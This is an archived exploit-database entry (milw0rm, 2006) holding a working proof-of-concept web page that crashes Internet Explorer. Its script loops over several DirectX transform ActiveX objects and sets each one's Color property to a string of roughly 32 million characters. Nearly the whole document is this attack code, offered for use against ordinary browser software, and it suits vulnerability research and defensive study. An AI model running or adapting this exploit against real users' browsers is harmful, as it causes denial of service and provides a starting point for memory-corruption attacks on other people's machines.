<html><head><title>MS Internet Explorer Multiple COM Object Color Property DoS</title></head><pre>&lt;!--

// Internet Explorer Multiple COM Object Color Property DoS Vulnerability
// tested on Windows 2000 SP4/XP SP2

// http://www.xsec.org
// nop (nop#xsec.org)

--!&gt;
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;&lt;/title&gt;
&lt;/head&gt;
&lt;/body&gt;
&lt;script&gt;
var i =0;
var Objects = new Array(

// CLSID: {3A04D93B-1EDD-4f3f-A375-A03EC19572C4}
// Info: MaskFilter
// ProgID: DXImageTransform.Microsoft.MaskFilter.1
// InprocServer32: C:\WINNT\system32\dxtmsft.dll
&quot;DXImageTransform.Microsoft.MaskFilter.1&quot;,

// CLSID: {421516C1-3CF8-11D2-952A-00C04FA34F05}
// Info: Chroma
// ProgID: DXImageTransform.Microsoft.Chroma.1
// InprocServer32: C:\WINNT\system32\dxtmsft.dll
&quot;DXImageTransform.Microsoft.Chroma.1&quot;,

// CLSID: {9F8E6421-3D9B-11D2-952A-00C04FA34F05}
// Info: Glow
// ProgID: DXImageTransform.Microsoft.Glow.1
// InprocServer32: C:\WINNT\system32\dxtmsft.dll
&quot;DXImageTransform.Microsoft.Glow.1&quot;,

// CLSID: {ADC6CB86-424C-11D2-952A-00C04FA34F05}
// Info: DropShadow
// ProgID: DXImageTransform.Microsoft.DropShadow.1
// InprocServer32: C:\WINNT\system32\dxtmsft.dll
&quot;DXImageTransform.Microsoft.DropShadow.1&quot;,

// CLSID: {E71B4063-3E59-11D2-952A-00C04FA34F05}
// Info: Shadow
// ProgID: DXImageTransform.Microsoft.Shadow.1
// InprocServer32: C:\WINNT\system32\dxtmsft.dll
&quot;DXImageTransform.Microsoft.Shadow.1&quot;,

// CLSID: {8241F015-84D3-11d2-97E6-0000F803FF7A}
// Info: Shapes
// ProgID: DX3DTransform.Microsoft.Shapes.1
// InprocServer32: C:\WINNT\system32\dxtmsft3.dll
&quot;DX3DTransform.Microsoft.Shapes.1&quot;,

null
);

var b = &quot;AAAA&quot;;

while(b.length &lt; 0x2000000)
{
   b += b;
}

while(Objects[i])
{
    var a = null;

    window.status = &quot;Create Object &quot; + Objects[i] + &quot;...&quot;;

    try { a = new ActiveXObject(Objects[i]); } catch(e){}

    if(a)
    {
       window.status = &quot;Try Set &quot; + Objects[i] + &quot;.Color ...&quot;;
       try { a.Color = b;} catch(e){}
    }

   i++;
}

window.status = &quot;failed!&quot;;

&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;

# milw0rm.com [2006-08-21]</pre></html>